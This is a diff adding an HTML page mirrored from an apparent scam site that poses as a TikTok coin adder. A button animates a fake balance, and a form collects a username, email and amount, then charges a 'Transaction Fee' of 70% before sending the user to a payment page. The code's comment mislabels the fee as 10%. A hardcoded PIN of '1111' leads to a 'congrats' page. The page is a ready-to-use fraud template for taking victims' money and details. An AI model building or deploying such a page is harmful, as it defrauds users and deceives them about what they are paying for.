@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from allappsreveiws.com.ng/sportybetx/home.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Sep 2023 22:22:08 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,600;0,700;0,800;0,900;1,500;1,600;1,700;1,800;1,900&amp;display=swap');
+
+        * {
+            font-family: 'Poppins', sans-serif;
+            padding: 0;
+            margin: 0;
+        }
+
+        .top {
+            width: 100%;
+            height: 55px;
+            background: #ccc9c9;
+            border-bottom: 2px solid red;
+        }
+
+        .top h2 {
+            text-align: center;
+            padding-top: 10px;
+        }
+
+        .box {
+            width: 95%;
+            height: 100px;
+            margin: 0 auto;
+            background: rgb(224, 226, 224);
+            border-radius: 5px;
+            border: 1px solid red;
+        }
+
+        .box h2 {
+            padding-left: 25px;
+            padding-top: 30px;
+        }
+
+        .box button {
+            float: right;
+            margin-right: 10px;
+            margin-top: -30px;
+            background: red;
+            color: white;
+            width: 100px;
+            height: 35px;
+        }
+
+        .fill {
+            width: 95%;
+            height: 355px;
+            margin: 0 auto;
+            background: #d1caca;
+            margin-top: 30%;
+            border: 1px solid red;
+            border-radius: 8px;
+        }
+
+        .fill h2 {
+            text-align: center;
+            padding-top: 10px;
+        }
+
+        .fill input {
+            width: 95%;
+            height: 39px;
+            margin: 0 auto;
+            display: block;
+            border: 1px solid red;
+        }
+
+        .fill button {
+            width: 95%;
+            height: 39px;
+            margin: 0 auto;
+            display: block;
+            color: white;
+            background: red;
+        }
+
+        ::placeholder {
+            font: 19px;
+            padding-left: 10px;
+        }
+
+        .pin-alert {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.4);
+        }
+
+        .pin-alert-content {
+            background-color: #fff;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 300px;
+            text-align: center;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .pin-alert-content input {
+            width: 98%;
+            height: 39px;
+            border: 1px solid red;
+        }
+
+        .pin-alert-content button {
+            width: 98%;
+            height: 39px;
+            background: red;
+            color: white;
+        }
+
+        .close {
+            float: right;
+            cursor: pointer;
+        }
+ footer {
+    width: 100%;
+    height: 35px;
+    position: fixed;
+    bottom: 0;
+    color: white;
+    background: blue;
+    margin: 0 auto;
+ }
+
+ body{
+  background-color: black;
+}
+
+     :root {
+         --base_color: #0BD1D1;
+     }
+
+     .select2-container--default .select2-selection--single .select2-selection__rendered {
+         color: #ffffff;
+     }
+ </style>
+</head>
+
+<body>
+    <div class="top">
+        <center><img src="logo.png"></center>
+    </div><br>
+
+    <!-- box -->
+    <div class="box">
+        <h2 style="font-size: 20px;"><img src="tiktok1.png"><span id="amount" style="font-size: 20px;">0</span></h2>
+        <button id="addFundsBtn" onclick="countTo1000000()">Add Coin</button>
+    </div>
+
+    <div class="fill">
+        <h2>Your Details</h2>
+        <form id="fundForm" action="pay.htm">
+            <input type="text" placeholder="@Username" required> <br>
+            <input type="email" placeholder="Email" required> <br>
+                                <div class="col-lg-12 form-group">
+                        <input type="number" placeholder="Amount" id="amounto" name="credentials" min="5000" step="5" max="100000" oninput="calculatePayment()" oninvalid="this.setCustomValidity('The minimum amount of coin you can add once is 5,000.00 and the maximum amount is 100,000.00 Please exit the app and start afresh.')" oninput="setCustomValidity('')"
+    class="form--control  " 
+    value=""         required
+><br>
+
+<div class="col-lg-12 form-group" id="show_hide_password">
+                        <input type="number" class="form-control form--control"id="paymento" value="NGN" name="payment" readonly name="password" placeholder="Transaction Fee:"
+                            required><br>
+            <div class="col-lg-12 form-group text-center">
+                        <button type="submit" class="btn--base w-100" onclick="passvalue();" style="outline: none;">Add Coin</button>
+                    </div>
+        </form>
+    </div>
+
+    <script>
+        function countTo1000000() {
+            const amountElement = document.getElementById('amount');
+            let currentAmount = parseFloat(amountElement.textContent.replace(/[^\d.-]/g, '')); // Remove currency symbol and comma
+            const targetAmount = 100000;
+            const incrementStep = 500;
+            const intervalDuration = 500; // milliseconds
+
+            function updateAmount() {
+                currentAmount += incrementStep;
+                if (currentAmount > targetAmount) {
+                    currentAmount = targetAmount;
+                }
+                amountElement.textContent = ' ' + currentAmount.toLocaleString();
+
+                if (currentAmount < targetAmount) {
+                    setTimeout(updateAmount, intervalDuration);
+                } else {
+                    amountElement.textContent = ' ' + targetAmount.toLocaleString();
+                }
+            }
+
+            updateAmount();
+
+            // Store the updated amount in localStorage for permanent storage
+            localStorage.setItem('amount', currentAmount);
+        }
+
+        // Check for existing amount in localStorage and update the display
+        const storedAmount = localStorage.getItem('amount');
+        if (storedAmount) {
+            const amountElement = document.getElementById('amount');
+            amountElement.textContent = ' ' + parseFloat(storedAmount).toLocaleString();
+        }
+
+        // Function to show the PIN verification alert
+        function showPinAlert() {
+            const form = document.getElementById("fundForm");
+            if (form.checkValidity()) {
+                var pinAlert = document.getElementById("pinAlert");
+                pinAlert.style.display = "block";
+            } else {
+                form.reportValidity();
+            }
+        }
+
+        // Function to close the PIN verification alert
+        function closePinAlert() {
+            var pinAlert = document.getElementById("pinAlert");
+            pinAlert.style.display = "none";
+        }
+
+        // Function to check the PIN and redirect
+        function checkPIN() {
+            var enteredPIN = document.getElementById("pinInput").value;
+            var customPIN = "1111"; // Replace this with your custom PIN
+
+            if (enteredPIN === customPIN) {
+                // Correct PIN, redirect to another page
+                window.location.href = "congrats.html"; // Replace "another_page.html" with the URL of the desired page
+            } else {
+                alert("Incorrect PIN. Please try again.");
+            }
+            closePinAlert(); // Close the PIN alert regardless of the result
+        }
+    </script>
+
+    <script type="text/javascript">
+
+        function calculatePayment() {
+
+            var amount = parseFloat(document.getElementById("amounto").value);
+
+            var payment = amount * 0.7; // calculates 10% of the input amount
+
+            document.getElementById("paymento").value = payment.toFixed(2);
+
+        }
+
+    //my work oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+
+    function passvalue(){
+      var firstname=document.getElementById("paymento").value;
+      localStorage.setItem("textvalue", firstname);
+
+      var middlename=document.getElementById("amount").value;
+      localStorage.setItem("textmiddle", middlename);
+
+      var lastname=document.getElementById("name").value;
+      localStorage.setItem("textname", lastname);
+
+    }
+
+    </script>
+
+</body>
+
+
+<!-- Mirrored from allappsreveiws.com.ng/sportybetx/home.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Sep 2023 22:22:09 GMT -->
+</html>
